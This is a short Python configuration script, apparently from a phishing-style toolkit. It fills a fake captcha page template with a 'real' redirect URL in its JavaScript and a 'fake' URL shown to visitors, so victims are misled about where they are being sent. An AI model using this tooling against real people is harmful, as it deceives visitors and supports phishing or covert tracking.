#!/usr/bin/env python3
import os
import utils
import re

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

real_forward = os.getenv('REDIRECT')
fake_forward = os.getenv('DISPLAY_URL')

if real_forward is None:
    real_forward = input(f'{G}[+] {C}Enter Real Forward URL :{W} ')
else:
    utils.print(f'{G}[+] {C}Real Forward URL :{W} '+real_forward)

if fake_forward is None:
    fake_forward = input(f'{G}[+] {C}Enter Fake Forward URL :{W} ')
else:
    utils.print(f'{G}[+] {C}Fake Forward URL :{W} '+fake_forward)

# Read from main_temp.js (template with REDIRECT_URL placeholder)
with open('template/captcha/js/main_temp.js', 'r') as location_temp:
    js_file = location_temp.read()
    # Replace REDIRECT_URL with the actual URL
    updated_js_raw = js_file.replace('REDIRECT_URL', real_forward)

# Write the processed main.js file
with open('template/captcha/js/main.js', 'w') as updated_js:
    updated_js.write(updated_js_raw)

# Assuming 'index_temp.html' is the template for the main HTML page
with open('template/captcha/index_temp.html', 'r') as temp_index:
    temp_index_data = temp_index.read()
    # Replace FAKE_REDIRECT_URL with the fake URL displayed to the user
    updated_index_raw = temp_index_data.replace('FAKE_REDIRECT_URL', fake_forward)

# Write the processed index.html file
with open('template/captcha/index.html', 'w') as updated_index:
    updated_index.write(updated_index_raw)

# Assuming 'anchor.html' is the template for the iframe content
with open('template/captcha/anchor.html', 'r') as temp_anchor:
    temp_anchor_data = temp_anchor.read()
    # Replace FAKE_REDIRECT_URL with the fake URL displayed to the user
    updated_anchor_raw = temp_anchor_data.replace('FAKE_REDIRECT_URL', fake_forward)

# Write the processed anchor.html file
with open('template/captcha/anchor.html', 'w') as updated_anchor:
    updated_anchor.write(updated_anchor_raw)

utils.print(f'{G}[+] {C}Templates modified successfully!{W}')